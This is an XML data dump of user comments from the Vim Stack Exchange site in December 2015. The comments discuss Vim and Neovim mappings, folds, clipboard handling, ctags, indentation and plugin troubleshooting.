  <row Id="8867" PostId="5718" Score="0" Text="ok, I've now figured out that the plugin has other variables to set the `margins` on each side of the character to align.  I'll need to create a special function for all uses to make default left and right margins=0." CreationDate="2015-12-07T14:53:48.710" UserId="2303" />
  <row Id="8868" PostId="5735" Score="0" Text="@BenLindsay maybe it happens with vim and not with gvim. Did you try remapping `\ll` to something like `\ll&lt;CR&gt;`? I don't know about suppressing the output sorry, I never saw it as a problem myself." CreationDate="2015-12-07T15:03:32.377" UserId="602" />
  <row Id="8869" PostId="5724" Score="0" Text="The function `get_name` could be defined in tens of files, is there a way to pinpoint specific one?" CreationDate="2015-12-07T15:37:41.453" UserId="5528" />
  <row Id="8870" PostId="5732" Score="0" Text="I've had similar problems in my Portuguese keyboard (but in Linux) and the solution was to pause between key presses. That is, if I press Ctrl, then wait, press AltGr, then wait, and finally press 9 this shortcut will work! Don't know why, though..." CreationDate="2015-12-07T15:54:18.763" UserId="599" />
  <row Id="8871" PostId="5703" Score="0" Text="This happens to me when I browse repositories with fugitive. Nerdtree too, not sure about the rest." CreationDate="2015-12-07T17:26:19.313" UserId="4655" />
  <row Id="8872" PostId="5740" Score="0" Text="I added that to my .vimrc and didn't see a change. I also tried to start vim, enter &quot;:set tags=/usr/include/***/tags&quot; and &quot;:set tags=/usr/include/pcl-1.7/pcl/tags&quot;. Neither of those worked. I also changed the owner to my username since those tags are in /usr and I might need sudo to access them. I did &quot;:echo tagfiles()&quot; and I see the path to the library tag file, but still I can't auto-complete and I get undefined reference errors in Syntastic. I tried to add the path to a tag file in my /opt directory and that worked fine. Any ideas for why that would happen?" CreationDate="2015-12-07T18:39:34.560" UserId="5552" />
  <row Id="8873" PostId="5750" Score="1" Text="You could do a macro .." CreationDate="2015-12-07T19:20:45.193" UserId="1800" />
  <row Id="8874" PostId="5750" Score="1" Text="This is a good idea (I assume you mean something like qpv[select...]q[move...]@p&quot;) but it doesn't really get at what I want, since in normal course of use I want to operate in visual mode, then only &quot;realize&quot; that I want the selection again after the paste operation. I'm looking for a few keystrokes to help in that circumstance, though I agree this is useful if I am operating slowly enough to anticipate needing to reselect the region." CreationDate="2015-12-07T19:32:45.370" UserId="4985" />
  <row Id="8875" PostId="5750" Score="0" Text="Actually there's another case where this isn't possible: pasting from outside vim (e.g. via the * register). In this case the question should be as in the parenthetical: is there a motion to visually select the last paste? This is useful e.g. for sending example code from Stackexchange from vim to a REPL." CreationDate="2015-12-07T19:36:16.580" UserId="4985" />
  <row Id="8876" PostId="5750" Score="0" Text="Actually, I'm not sure what you want - to remember the &quot;coordinates&quot; of last paste, *before* further changes, in order to reselect them easily?" CreationDate="2015-12-07T19:52:35.083" UserId="1800" />
  <row Id="8877" PostId="5745" Score="1" Text="This is exactly what I was looking for :)... I initially wanted to know for curiosity and also because I use vim-signature, and gitgutter for vim but they both use the sign column. I was wanting to see if I could add an extra sign column so that I could use the information from both plugins simultaneously, but it would appear that this is not possible. I did find that vim-signature has a flag you can set that helps with that. See the [issue I had opened here](https://github.com/airblade/vim-gitgutter/issues/289) which also has my solution and a link to the commit I made on my vimrc to use it." CreationDate="2015-12-08T01:51:51.943" UserId="3217" />
  <row Id="8878" PostId="5753" Score="0" Text="What editor are you using? There is no mention of a &quot;terminal&quot; buftype in the Vim reference manual." CreationDate="2015-12-08T04:28:53.833" UserId="2055" />
  <row Id="8879" PostId="5754" Score="1" Text="It doesn't reselect the same shape, but the same number of characters." CreationDate="2015-12-08T07:52:49.090" UserId="205" />
  <row Id="8880" PostId="5753" Score="1" Text="I don't consider this an actual answer to your question, but since you'll be defining maps for both `^E` and `^Y`, why could you just not call the function with `:call ScrollStop('E')` and `:call ScrollStop('Y')` respectively? Why would it need to be the control character and not just a string?" CreationDate="2015-12-08T07:59:59.643" UserId="1672" />
  <row Id="8882" PostId="5758" Score="0" Text="Ahhhh thank you. I knew it was something like this but I couldn't get the syntax right. Cheers mate." CreationDate="2015-12-08T13:30:45.217" UserId="5572" />
  <row Id="8883" PostId="5751" Score="1" Text="OK yes, tested this and it works; this is great. Really this is my fault for asking two related questions in one. I think what I'll do is change this question to be the one you've correctly answered here, and then re-ask the related question as a separate question, unless a mod has a better idea." CreationDate="2015-12-08T14:39:48.287" UserId="4985" />
  <row Id="8884" PostId="5754" Score="0" Text="Tested this and it also seems to work with the caveat @muru notes. In most instances when the re-select is not for selecting pasted text but recreating a selection then correctly positioning the cursor will imply that selecting the same number of characters will recreate the same shape. BUT, I can imagine exceptions. So still curious about an alternative approach that duplicates the shape. Maybe this is impossible in circumstances where lines don't have the same length." CreationDate="2015-12-08T14:42:45.753" UserId="4985" />
  <row Id="8885" PostId="5763" Score="3" Text="Also, `&lt;C-f&gt;` is typically defined in `'indentkeys'` or `'cinkeys'` (depending on which indent mechanism is being used) which will allow you to reindent the current line to where it should be, from insert mode.  See [:help i_CTRL-F](http://vimhelp.appspot.com/indent.txt.html#i_CTRL-F)" CreationDate="2015-12-08T17:33:30.850" UserId="15" />
  <row Id="8887" PostId="5753" Score="0" Text="@garyjohn, I'm using Neovim but the question isn't specific to terminal buffers." CreationDate="2015-12-08T18:49:59.847" UserId="1472" />
  <row Id="8888" PostId="5753" Score="0" Text="@SakariCajanus certainly I can do that and then just have an if statement in my function but I'd like to know if there is a way to just pass the control-character so I don't need to add the if statements, which saves a small amount of code in my trivial example but could be useful in other cases" CreationDate="2015-12-08T18:53:08.847" UserId="1472" />
  <row Id="8891" PostId="5751" Score="0" Text="Actually that question is asked and answered here: http://vi.stackexchange.com/questions/31/how-do-i-visually-select-the-block-of-text-i-just-pasted-in-vim?rq=1 Sorry--my fault for making a mess." CreationDate="2015-12-08T20:20:41.790" UserId="4985" />
  <row Id="8892" PostId="5773" Score="2" Text="the downside here is that you lose your position in the file" CreationDate="2015-12-08T20:56:00.887" UserId="488" />
  <row Id="8893" PostId="5773" Score="0" Text="All the other answers share that downside and the OP didn't mention &quot;respect the cursor position&quot; as a requirement." CreationDate="2015-12-08T21:05:37.353" UserId="54" />
  <row Id="8894" PostId="5773" Score="1" Text="&lt;c-o&gt;  can be used to go back to your previous position @romainl's solution requires you to go back twice while the other only require going back once" CreationDate="2015-12-08T21:24:04.443" UserId="1472" />
  <row Id="8895" PostId="5753" Score="1" Text="It's true that the answer isn't specific to terminal buffers, but it _is_ specific to the editor, and it _could_ depend on differences between Neovim and Vim. The following works with Vim and may work with Neovim as well. `:function MyScroll(key)` `:exe 'normal' a:key` `:endfunction` `:call MyScroll('^E')` where I entered `^E` by typing `Ctrl-V Ctrl-E`." CreationDate="2015-12-08T21:31:18.530" UserId="2055" />
  <row Id="8897" PostId="5753" Score="0" Text="@garyjohn, your MyScroll function works in both Vim and Neovim when called from the command prompt. It only when I try and make a mapping that it stops working (for both Vim and Neovim). You've help me narrow the issue though so thanks for that!" CreationDate="2015-12-08T21:59:13.373" UserId="1472" />
  <row Id="8898" PostId="5773" Score="0" Text="Surely you can appreciate the value of keeping your place, and how an answer that would keep that position would be valuable." CreationDate="2015-12-08T22:33:08.070" UserId="488" />
  <row Id="8899" PostId="5773" Score="0" Text="@TankorSmash, yes, but that's not what the OP asked." CreationDate="2015-12-08T22:51:26.807" UserId="54" />
  <row Id="8900" PostId="5773" Score="1" Text="That's why it's not being downvoted. It's simply a note saying there's a better option somewhere and that they should keep looking. For example, on a programming SE site, sloppy code that solves the problem solves the problem, but you'd still expect to find another solution that solves the problem and looks good." CreationDate="2015-12-08T23:04:11.740" UserId="488" />
  <row Id="8901" PostId="5775" Score="3" Text="Just a note to complete the answer: OP also mentioned the possibility to go one symbol less in visual mode which can be done with `:vnoremap $ $h`" CreationDate="2015-12-08T23:14:59.287" UserId="1841" />
  <row Id="8902" PostId="5773" Score="0" Text="@brettanomyces, use backtick-backtick to come back." CreationDate="2015-12-09T00:36:09.413" UserId="54" />
  <row Id="8903" PostId="5768" Score="5" Text="Because of the title of this question (&quot;apply a command to all lines&quot;), I feel it's worth noting that the example in the question mentions the Normal-mode operator `&gt;`, while this answer uses the Command-mode command `:&gt;`. These are not, strictly speaking, the same thing. That they have the same name should be considered a coincidence; don't assume you can interchange operators and commands in general. For example, the `gU` operator converts text to uppercase, but `:%gU` is *not* a valid command to apply the same to the entire buffer." CreationDate="2015-12-09T00:43:58.707" UserId="64" />
  <row Id="8904" PostId="5773" Score="0" Text="@romainl backtick-backtick i find is harder to reach on the keyboard, plus with your soulution at least backtick-backtick will only return you to the top of the file, not to where you were before the gg." CreationDate="2015-12-09T00:46:01.187" UserId="1472" />
  <row Id="8905" PostId="5773" Score="0" Text="Nope, it brings me to the position before `gg&gt;G`." CreationDate="2015-12-09T06:27:47.320" UserId="54" />
  <row Id="8906" PostId="5175" Score="0" Text="Maybe you can report it in the neovim issue tracker, so a feature might show up there that you can use to implement this." CreationDate="2015-12-09T14:28:59.700" UserId="5592" />
  <row Id="8907" PostId="5740" Score="0" Text="I am accepting the answer even though my problem still exists because I think my problem is not normal. As I said in my previous comment, when I did this for another library it worked fine so this would be the normal way of doing things." CreationDate="2015-12-09T15:49:26.170" UserId="5552" />
  <row Id="8908" PostId="5780" Score="0" Text="You can view a list when you try to autocomplete on `:setfiletype ` (i.e. with `Tab` after a space). Not sure if it's the complete list, or how to capture it to some buffer/file." CreationDate="2015-12-09T21:07:38.697" UserId="1800" />
  <row Id="8909" PostId="5780" Score="0" Text="Use `&lt;c-d&gt;` instead of `&lt;tab&gt;` to list completions." CreationDate="2015-12-09T21:50:38.450" UserId="778" />
  <row Id="8910" PostId="5783" Score="0" Text="vim-sleuth may be a good plugin to have in order to automatically pick up indentation settings. (https://github.com/tpope/vim-sleuth)" CreationDate="2015-12-10T02:10:20.607" UserId="1472" />
  <row Id="8911" PostId="5785" Score="3" Text="Call `fnamemodify(..., ':p')` on the results?" CreationDate="2015-12-10T06:16:55.413" UserId="2313" />
  <row Id="8912" PostId="5785" Score="0" Text="AFAICT, you can not with current implementation of `findfile()`." CreationDate="2015-12-10T07:45:14.640" UserId="1892" />
  <row Id="8913" PostId="5794" Score="0" Text="I'm aware about sessions. But seems it is not the same - it saves all opened buffers and tabs (and settings) but if you have some changes in one of buffers you must write them to disk before exit. In sublime text you do not need to save opened file on exit - sublime saves all changes to it in separate place and restores them on reopen. So original file is untouched on disk but the changes are not lost too" CreationDate="2015-12-10T14:03:26.237" UserId="5608" />
  <row Id="8914" PostId="5794" Score="0" Text="Yes, that would be the main difference. No idea if it can be achieved in any way without resorting to tmux/screen/detach." CreationDate="2015-12-10T14:07:56.767" UserId="54" />
  <row Id="8915" PostId="5795" Score="2" Text="See `:help =`. All information to be checked is there." CreationDate="2015-12-10T16:11:05.837" UserId="1800" />
  <row Id="8916" PostId="5735" Score="0" Text="@glS That mapping isn't working for me, but I've decided to live with pressing enter. I just started pressing enter during compilation, so there's no extra time delay. I still would like to have the compilation output go somewhere else besides my current terminal session though." CreationDate="2015-12-10T16:13:10.013" UserId="5043" />
  <row Id="8917" PostId="5735" Score="0" Text="@KarlYngveLervåg I might start looking into other plugins like yours or LaTex-Box. Does your package (or any other package that you know of) provide a way to direct the compilation output to somewhere other than my current terminal session?" CreationDate="2015-12-10T16:15:24.743" UserId="5043" />
  <row Id="8918" PostId="5785" Score="0" Text="@SatoKatsura I'll accept that if you post it as an answer." CreationDate="2015-12-10T17:59:51.630" UserId="865" />
  <row Id="8921" PostId="5795" Score="0" Text="@VanLaser Thanks for the tip, though that just furthers the mystery." CreationDate="2015-12-10T20:56:48.277" UserId="69" />
  <row Id="8922" PostId="5795" Score="1" Text="You either have a vim configuration that uses `indent`, or you don't have support for internal indenting with `=` in Vim (which means, it *has* to use an external `indent` program). But, in this way, you seem to loose the ability to only indent a line (probably `indent` wants an entire file, a valid/complete text as input). Reference: http://stackoverflow.com/a/19590619/5000478. Also, even if `.vimrc` is empty, it's still possible that a system-wide `vimrc` is used/read. Try starting vim as `vim -u ~/.vimrc` and check how `=` works (is it still relying on `indent`?)." CreationDate="2015-12-10T21:14:43.677" UserId="1800" />
  <row Id="8923" PostId="5795" Score="1" Text="And this is the help your vim should have displayed: http://pastebin.com/jaCTFB6k Perhaps you could install a &quot;normal&quot; vim version on that server?" CreationDate="2015-12-10T23:55:53.893" UserId="1800" />
  <row Id="8924" PostId="5800" Score="2" Text="use `:verbose :map &lt;Esc&gt;` to find out, what created that map. If this is some plugin, you can disable it." CreationDate="2015-12-11T08:30:33.077" UserId="71" />
  <row Id="8925" PostId="5800" Score="0" Text="@ChristianBrabandt I've added the result to the original question. I definitely don't have that set in the .vimrc, so I'm not sure whats going on here." CreationDate="2015-12-11T09:34:48.490" UserId="2129" />
  <row Id="8926" PostId="5785" Score="0" Text="Then you'd be wrong to do it.  A real answer would have to distinguish between `finddir()` / `findfile()` returning a string, and returning a list. :)" CreationDate="2015-12-11T09:54:58.497" UserId="2313" />
  <row Id="8927" PostId="5801" Score="1" Text="That's the traditional escape sequence, and more so in Vim: `:h i_CTRL-[`" CreationDate="2015-12-11T10:12:52.617" UserId="1800" />
  <row Id="8928" PostId="5783" Score="1" Text="+1 for mentioning my NrrwRgn plugin ;)" CreationDate="2015-12-11T10:40:04.233" UserId="71" />
  <row Id="8929" PostId="5802" Score="1" Text="Thanks, I was trying to bind Control-[ and right ] to move through the buffers. Glad I learnt it the hard way cheers." CreationDate="2015-12-11T10:50:17.113" UserId="2129" />
  <row Id="8930" PostId="5801" Score="1" Text="@VanLaser thanks, I learnt it the hard way :)" CreationDate="2015-12-11T10:51:10.617" UserId="2129" />
  <row Id="8931" PostId="5791" Score="0" Text=":xa	exit all (save all changes and close Vim)" CreationDate="2015-12-10T13:43:08.013" UserId="5600" />
  <row Id="8932" PostId="5791" Score="0" Text="This writes the files, but doesn't save anything else.  I think the OP wants something that both saves the files without writing them, and saves the state of any open tabs or buffers" CreationDate="2015-12-10T20:27:44.643" UserId="865" />
  <row Id="8933" PostId="5791" Score="0" Text="Yes, I understood that later from his comments." CreationDate="2015-12-10T20:32:53.147" UserId="5600" />
  <row Id="8934" PostId="5796" Score="0" Text="I was going to write an answer using a recursive macro (with basically the same logic), but this is better in every way so I'll just +1 this instead" CreationDate="2015-12-11T20:59:22.080" UserId="514" />
  <row Id="8935" PostId="5778" Score="1" Text="This executes the commands sequentially -- so `:1d|4d` would delete the first line, then delete the fourth line, which was the fifth line before the first line was deleted. Doing it in reverse would allow it to be more intuitive -- `:32d|4d|1d`." CreationDate="2015-12-12T01:20:49.803" UserId="514" />
  <row Id="8936" PostId="5803" Score="1" Text="Operator-pending mode has nothing to do with `&lt;C-r&gt;`, it is for normal-mode commands like `d`. First variant does work for me, if it does not for you check `:h timeoutlen` and `:h timeout`." CreationDate="2015-12-12T04:39:37.283" UserId="2566" />
  <row Id="8937" PostId="5803" Score="0" Text="It is also possible that first mapping does not work as you are in compatible mode. Specifically `&amp;cpoptions` setting must *not* contain `&lt;`. Fixed either by adding `set nocompatible` explicitly at the start of the vimrc (and verifying that no command adds `&lt;` to `&amp;cpoptions` later), or by using `inoremap &lt;special&gt; &lt;C-r&gt;* &lt;C-r&gt;+`. This variant is rather unlikely because Vim starts in nocompatible mode when it finds `~/.vimrc` file (except for the case when you used `-u ~/.vimrc`)." CreationDate="2015-12-12T04:45:19.337" UserId="2566" />
  <row Id="8938" PostId="5803" Score="0" Text="The first mapping works fine for me. Another reason why it might not work for you would be if you have set `notimeout`, or you have set `timeoutlen` or `ttimeoutlen` too low. `:verb set timeout? timeoutlen? ttimeoutlen?` to check." CreationDate="2015-12-12T04:49:14.777" UserId="630" />
  <row Id="8939" PostId="3074" Score="0" Text="Yes, I found that's what I have had to use for `vim` in terminals. The way to discover such things is to see what Vim produces when you type `i&lt;Ctrl-V&gt;&lt;Ctrl-Space&gt;` or `:&lt;Ctrl-V&gt;&lt;Ctrl-Space&gt;`." CreationDate="2015-12-12T04:53:22.527" UserId="630" />
  <row Id="8940" PostId="3074" Score="0" Text="Beware if you use Ubuntu 14.04, iBus may be intercepting the keystroke. Check the preferences of the little keyboard icon in the dock that lets you select language / keyboard input method, and change the mapping to something else (I went for `&lt;Ctrl-Alt-Space&gt;`)." CreationDate="2015-12-12T04:56:48.557" UserId="630" />
  <row Id="8941" PostId="5783" Score="0" Text="If NrrwRgn doesn't bring the filetype of the original buffer with it, perhaps it could be modified to do so... Although if it is often used to handle snippets of embedded code (of a different filetype) then perhaps an automatic `filetype detect` would be preferable." CreationDate="2015-12-12T05:01:13.003" UserId="630" />
  <row Id="8942" PostId="5803" Score="0" Text="Thanks for the input guys. Here's my timeout config: http://trusktr.io:7777/xepuhoduki." CreationDate="2015-12-12T07:22:00.130" UserId="5626" />
  <row Id="8943" PostId="5803" Score="1" Text="Alright, so it seems to be working for me now. I disabled `set notimeout`, but then I re-enabled it, and now it keeps working. It's strange to me. Maybe there's a subtle bug in Neovim, as I've had the timeout behavior randomly change after a while too..." CreationDate="2015-12-12T07:29:17.373" UserId="5626" />
  <row Id="8944" PostId="5783" Score="0" Text="One could probably use `:h NR-hooks` for this :)" CreationDate="2015-12-12T10:01:25.553" UserId="1800" />
  <row Id="8945" PostId="5803" Score="0" Text="Why not `set clipboard^=unnamedplus clipboard^=unnamed`?" CreationDate="2015-12-12T10:56:14.740" UserId="54" />
  <row Id="8946" PostId="5806" Score="0" Text="Easily, compose the operation with the motion, as usual: `yl`" CreationDate="2015-12-12T22:40:29.220" UserId="1800" />
  <row Id="8947" PostId="5806" Score="0" Text="@VanLaser Good idea! I was thinking that movement wouldn't work because I only wanted that one character. But your suggestion works great for ASCII. Post that as an answer and I'll vote it up. Interestingly it doesn't work with this Unicode character, but `ytX` (&quot;`y`ank `t`il `X`&quot;) seems to work when `X` is the character just to the right." CreationDate="2015-12-12T22:51:13.707" UserId="1111" />
  <row Id="8948" PostId="5806" Score="0" Text="I wonder, is that one character, be it Unicode, or aren't there two characters, hidden/replaced using Vim `conceal` feature?" CreationDate="2015-12-12T22:57:14.313" UserId="1800" />
  <row Id="8949" PostId="5805" Score="0" Text="Thanks you VIM user!" CreationDate="2015-12-12T23:24:04.577" UserId="5631" />
  <row Id="8950" PostId="5806" Score="0" Text="@VanLaser Seems like two &quot;characters&quot;." CreationDate="2015-12-12T23:50:33.093" UserId="1111" />
  <row Id="8951" PostId="2256" Score="0" Text="[AllChars](http://sourceforge.net/projects/allchars/) works great on Windows! Thanks!" CreationDate="2015-12-13T00:45:52.380" UserId="1111" />
  <row Id="8952" PostId="5803" Score="0" Text="@romainl `set clipboard^=unnamedplus clipboard^=unnamed` doesn't do the same thing. I want to explicitly copy to, or paste from my desktop clipboard with `&quot;*yy`, `&quot;*dd`, `&quot;*p`, etc. Otherwise, I don't want (neo)vim to touch the desktop clipboard on normal operations without &quot;* (the behavior I'm talking about is the default for Vim for OS X, and I'm just trying to emulate that in Linux). Basically, these two commands seem to make it happen: `noremap &quot;* &quot;+` and `inoremap &lt;c-r&gt;* &lt;c-r&gt;+`." CreationDate="2015-12-13T02:18:10.983" UserId="5626" />
  <row Id="8953" PostId="5803" Score="0" Text="This is not a Vim issue at all; this is obviously a system-level issue and you are taking it from the wrong angle. On linux/bsd you can use a very small program called [autocutsel](http://www.nongnu.org/autocutsel/) to synchronize the PRIMARY and CLIPBOARD &quot;clipboards&quot;." CreationDate="2015-12-13T09:42:56.413" UserId="54" />
  <row Id="8955" PostId="5807" Score="1" Text="They have an issue tracker, use it." CreationDate="2015-12-13T09:44:41.517" UserId="54" />
  <row Id="8956" PostId="5810" Score="0" Text="what vim version is this?" CreationDate="2015-12-13T14:07:46.337" UserId="71" />
  <row Id="8957" PostId="5810" Score="1" Text="@ChristianBrabandt I'm using vim version 7.4.942. I've edited my question because I think the problem comes from creating a fold inside a buffer." CreationDate="2015-12-13T16:20:48.123" UserId="4939" />
  <row Id="8958" PostId="5795" Score="0" Text="I'm not sure how to solve your question, but at least &quot;:help =&quot; ought to be run.&#xA;So i suggest you reinstall vim!" CreationDate="2015-12-13T08:11:42.990" UserId="5637" />
  <row Id="8959" PostId="5803" Score="0" Text="@romainl You may be right! But this vim solution turned out to be quick and simple in the only ever instance of this &quot;system issue&quot; getting in the way of my workflow, so it's a good enough solution for me. Thanks for the input. :]" CreationDate="2015-12-13T18:08:31.690" UserId="5626" />
  <row Id="8960" PostId="5812" Score="1" Text="To see if I got that right, if I have a fold from lines 2 to 10, and I run `:3,4bd`, this actually gets replaced to something equivalent to `:2,10bd` ?" CreationDate="2015-12-13T18:13:34.247" UserId="1800" />
  <row Id="8961" PostId="5812" Score="2" Text="yes, i believe this is what happens." CreationDate="2015-12-13T18:35:10.843" UserId="71" />
  <row Id="8962" PostId="5811" Score="2" Text="Yanking `»` works fine for me too. I use `vy` to yank a single character. Not sure why I use that rather than `yl`, maybe I had a conscious reason once but now it's just reflex." CreationDate="2015-12-13T19:07:19.867" UserId="1306" />
  <row Id="8963" PostId="5812" Score="3" Text="In any case, I just made a patch. Let's see what Bram thinks." CreationDate="2015-12-13T19:27:07.573" UserId="71" />
  <row Id="8965" PostId="5812" Score="0" Text="@ChristianBrabandt Thank you very much for the patch ! I really hope it will be accepted, because it's really annoying for someone who uses folds. Even outside of the fold, the range is still modified. Inside the `test` buffer, when I add `&quot; hello world !` on a new line, under the fold, and put the cursor under it to be clearly outside of the fold, `:3,4bd` is still modified to `:1,5bd`. If you've got favorite files on which you put some marks, and you replace `:bd` with `:bw` you can lose all your marks." CreationDate="2015-12-13T20:00:30.290" UserId="4939" />
  <row Id="8966" PostId="5619" Score="0" Text="Possible lead to answer: http://stackoverflow.com/q/11740202/1600630" CreationDate="2015-12-13T20:43:15.863" UserId="2303" />
  <row Id="8967" PostId="5619" Score="0" Text="@Cometsong thanks but even once you get ctags to recognise the filetype , the only tag type ctags is capable of producing for shell files - by default - is functions. essentially a regex rule needs to be written. the rules are pretty easy to write, which make me assume (possibly wrongly) there is some problem others havent been able to solve and hence no regex rule as of yet." CreationDate="2015-12-13T20:53:15.900" UserId="4603" />
  <row Id="8968" PostId="5816" Score="0" Text="thanks, why did you delete your regex? I think it needed  a `^` plus needed the ability to capture strings inside quotes on the right side of `=` e.g. `foo=&quot;hello world&quot;`" CreationDate="2015-12-13T21:17:09.210" UserId="4603" />
  <row Id="8970" PostId="5571" Score="0" Text="See `:h paste`. Basically a lot of stuff gets disabled, so no, you don't want that." CreationDate="2015-12-13T22:49:50.817" UserId="1800" />
  <row Id="8971" PostId="5816" Score="0" Text="See edit for example (currently untested)." CreationDate="2015-12-13T23:00:48.950" UserId="2303" />
  <row Id="8972" PostId="5806" Score="0" Text="BTW, how do you introduce the `»` character?" CreationDate="2015-12-13T23:38:26.093" UserId="1800" />
  <row Id="8973" PostId="5806" Score="0" Text="Rather than yutting (that ought to be a standard abbreviation for yank-put, but by saying so I've made this a whole lot longer) the character you can type (in insert mode) `&lt;C-K&gt;&gt;&gt;`. This uses digraphs to insert the `»` character. It's probably faster than exiting insert mode, navigating to the character, yanking it, navigating back, and putting." CreationDate="2015-12-14T00:02:48.663" UserId="1306" />
  <row Id="8974" PostId="5811" Score="1" Text="I've always done `y&lt;space&gt;` thinking it was yank the character under the cursor, and I was going to add it as an answer but after checking the help I realize `&lt;space&gt;` and `l` are the same thing." CreationDate="2015-12-14T00:07:46.790" UserId="1472" />
  <row Id="8975" PostId="5806" Score="0" Text="On my keyboard layout I can use the `AltGr``&gt;` combo to insert that character. I was asking more to check the remote possibility that the un-yank-able  `»` was a conceal character for a `&gt;&gt;` sequence." CreationDate="2015-12-14T00:17:15.537" UserId="1800" />
  <row Id="8976" PostId="5811" Score="0" Text="That's nice, and seemingly even easier to hit, except perhaps when the space is used as leader." CreationDate="2015-12-14T00:19:30.420" UserId="1800" />
  <row Id="8977" PostId="5810" Score="0" Text="The question (and its editing) was quite insightful, hope more people will upvote it :)" CreationDate="2015-12-14T00:27:53.520" UserId="1800" />
  <row Id="8978" PostId="5818" Score="5" Text="The wiki is very close to useless. Read `:help autoindent` and `:help smartindent`." CreationDate="2015-12-14T08:54:58.153" UserId="54" />
  <row Id="8979" PostId="5811" Score="0" Text="@jjaderberg I like your comment, please post it as an answer. Thanks!" CreationDate="2015-12-14T14:46:30.920" UserId="1111" />
  <row Id="8980" PostId="5811" Score="0" Text="@brettanomyces I like your comment, please post it as an answer. Thanks!" CreationDate="2015-12-14T14:48:20.817" UserId="1111" />
  <row Id="8981" PostId="5821" Score="2" Text="are you sure about the 're' engine thing? I don't see how this makes a difference." CreationDate="2015-12-14T15:23:47.110" UserId="71" />
  <row Id="8982" PostId="5812" Score="1" Text="@saginaw It does not really matter, where the cursor is, just if the range given falls into a folded region." CreationDate="2015-12-14T15:24:33.577" UserId="71" />
  <row Id="8983" PostId="5821" Score="0" Text="Nope, not sure at all ... I did a quick test that didn't work, then re-read about `pattern` in the help file, saw mentioned that the new engine is more limited than the old one, assumed that's the cause ... my first test was rather/possibly flawed" CreationDate="2015-12-14T16:25:30.190" UserId="1800" />
  <row Id="8985" PostId="5823" Score="2" Text="You can use `env`: `EDITOR='env VIM_LIGHT_MODE=1 vim'`." CreationDate="2015-12-12T21:16:13.903" UserId="963" />
  <row Id="8986" PostId="5823" Score="3" Text="You can also use another initialization file and run `vim` as `vim -u .vimrc-light`." CreationDate="2015-12-12T21:23:42.353" UserId="963" />
  <row Id="8987" PostId="5823" Score="1" Text="Oh.. Your both ideas are cool, thanks. And I wasn't aware of `env` at all, my shell-fu is still too weak.&#xA;Consider writing it as an answer, so that I'll be able to accept it." CreationDate="2015-12-12T21:37:55.793" UserId="2913" />
  <row Id="8989" PostId="5826" Score="0" Text="For the second question, I answered myself ```set ttimeout&#xA;set timeoutlen=150 ttimeoutlen=100```" CreationDate="2015-12-14T20:52:57.003" UserId="2513" />
  <row Id="8990" PostId="5826" Score="0" Text="`:h f` also helps" CreationDate="2015-12-14T22:38:32.537" UserId="1800" />
  <row Id="8991" PostId="5826" Score="1" Text="IMHO, if you want a global remapping of `&lt;` and `&gt;`, you should do this at the OS level, not inside Vim. On Linux, this could be done with `xmodmap` or similar." CreationDate="2015-12-15T07:27:15.340" UserId="21" />
  <row Id="8992" PostId="5820" Score="0" Text="This seems like a bug. It doesn't work for me either (I'm on Vim 7.4.944)." CreationDate="2015-12-15T07:55:31.363" UserId="21" />
  <row Id="8993" PostId="5820" Score="0" Text="Should it work? That's what I don't know." CreationDate="2015-12-15T08:21:41.700" UserId="626" />
  <row Id="8994" PostId="5828" Score="0" Text="How did you call the function?" CreationDate="2015-12-15T09:06:58.353" UserId="205" />
  <row Id="8995" PostId="5828" Score="0" Text="call NERDTreeHighlightFile('c'. 'yellow', 'none')" CreationDate="2015-12-15T09:14:54.560" UserId="5652" />
  <row Id="8996" PostId="5828" Score="1" Text="You can [edit] your post to add information." CreationDate="2015-12-15T09:15:20.853" UserId="205" />
  <row Id="8997" PostId="5828" Score="0" Text="So that's basically how the function is run for all filetypes, the &quot;.h&quot; files get called in the exact same way, (with yellow etc) and they are highlighted properly." CreationDate="2015-12-15T09:16:12.683" UserId="5652" />
  <row Id="8998" PostId="5831" Score="0" Text="Searching in gvim.exe yield matches of python27.dll and python32.dll. My python installations (which are also in the path) are 2.7 and 3.5. Weird things is, why does it search for `msys-python2.7.dll` and not `python2.7.dll`?" CreationDate="2015-12-15T11:03:03.580" UserId="2455" />
  <row Id="8999" PostId="5831" Score="0" Text="You mentioned you are running vim from mingw64 on windows, which should explain the `msys*` reference ([Msys in wikipedia](https://en.wikipedia.org/wiki/MinGW)). Try duplicating the executable to match the name on the error message." CreationDate="2015-12-15T11:27:24.877" UserId="1405" />
  <row Id="9000" PostId="5820" Score="0" Text="The documentation seems to imply that it should work." CreationDate="2015-12-15T11:48:24.997" UserId="21" />
  <row Id="9001" PostId="5832" Score="1" Text="You will need a plugin for that. Something like neocomplete or youcompleteme. Also, if you want IDE features, you should probably use an IDE." CreationDate="2015-12-15T12:20:25.857" UserId="54" />
  <row Id="9002" PostId="5832" Score="1" Text="@romainl Ah, I use neocomplete, which I failed to mention. Updated." CreationDate="2015-12-15T12:23:53.003" UserId="1072" />
  <row Id="9003" PostId="5832" Score="1" Text="Well, that's kind of the whole point of neocomplete so, if it doesn't work for you you will need to ask another question or head to the plugin's issue tracker." CreationDate="2015-12-15T13:34:05.327" UserId="54" />
  <row Id="9004" PostId="5830" Score="0" Text="Thank you very much for the lesson!" CreationDate="2015-12-15T18:32:02.633" UserId="2913" />
  <row Id="9005" PostId="5838" Score="3" Text="What's the question here, exactly?" CreationDate="2015-12-15T19:22:07.623" UserId="205" />
  <row Id="9006" PostId="5838" Score="4" Text="You should read `:help :make`." CreationDate="2015-12-15T19:54:03.190" UserId="54" />
  <row Id="9007" PostId="5838" Score="0" Text="Definitively, use the quickfix feature, then you can always add/define a syntax highlighting to highlight the errors." CreationDate="2015-12-16T08:36:56.413" UserId="626" />
  <row Id="9008" PostId="5838" Score="0" Text="Also important: `:help 'errorformat'`" CreationDate="2015-12-16T12:05:27.527" UserId="599" />
  <row Id="9009" PostId="5841" Score="2" Text="`^@` is Ctrl-@, indicating the ASCII NUL character, which shouldn't be there since `system` replaces NULs with SOH (`^A`)." CreationDate="2015-12-16T12:46:50.127" UserId="205" />
